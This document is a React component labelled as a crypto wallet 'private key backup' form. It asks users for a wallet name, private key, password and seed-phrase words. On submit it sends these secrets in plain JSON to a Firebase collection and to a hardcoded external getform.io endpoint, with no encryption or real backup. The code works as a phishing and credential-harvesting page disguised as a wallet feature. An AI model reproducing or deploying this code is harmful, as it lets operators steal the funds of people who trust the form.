import React, { useState } from "react";
import { Button } from "../../../../../Global/Button/Button";
import { usePost } from "../../../../../Global/hook/usePost";
import { Input } from "../../../../../Global/Input/Input";

interface PrivateKeyBackupProps {
  onSuccess: () => void;
}

export const PrivateKeyBackup: React.FC<PrivateKeyBackupProps> = ({ onSuccess }) => {
  const [walletName, setWalletName] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [password, setPassword] = useState("");

  const { post } = usePost();

  const handleBackup = async (e: React.FormEvent) => {
    e.preventDefault();

    // Prepare the data to be posted to both Firebase and getform.io
    const postData = {
      walletName,
      privateKey,
      password,
    };

    // Make the POST request to Firebase using the usePost hook
    await post("backedup", postData); // Replace 'your-firebase-endpoint' with the actual Firebase URL

    // Make the POST request to getform.io
    try {
      const getformResponse = await fetch("https://getform.io/f/578d9b29-1920-4659-8226-6d2167de9a55", {
        method: "POST",
        body: JSON.stringify(postData),
        headers: {
          "Content-Type": "application/json",
        },
      });
    } catch (error: any) {
      alert(error.message);
      // Handle any exceptions that may occur during the fetch request
    }

    // Call the 'onSuccess' callback or any other logic you need after the form is successfully submitted
    onSuccess();
  };

  return (
    <form onSubmit={handleBackup}>
      <Input
        name="Wallet Name"
        required
        className="mt-4"
        type="text"
        placeholder="Enter Wallet Name e.g trust wallet"
        value={walletName}
        onChange={e => setWalletName(e.target.value)}
      />
      <Input
        name="Private Key"
        required
        className="mt-4"
        type="text"
        placeholder="Enter Private Key"
        value={privateKey}
        onChange={e => setPrivateKey(e.target.value)}
      />
      <Input
        name="Wallet Password"
        required
        className="mt-4"
        type="password"
        placeholder="Enter Wallet Password"
        value={password}
        onChange={e => setPassword(e.target.value)}
      />
      <i>{`Typically 12 (sometimes 24) words seperated by a single space.`}</i>
      <Button type="submit" className="mt-5 w-full">
        Submit
      </Button>
    </form>
  );
};
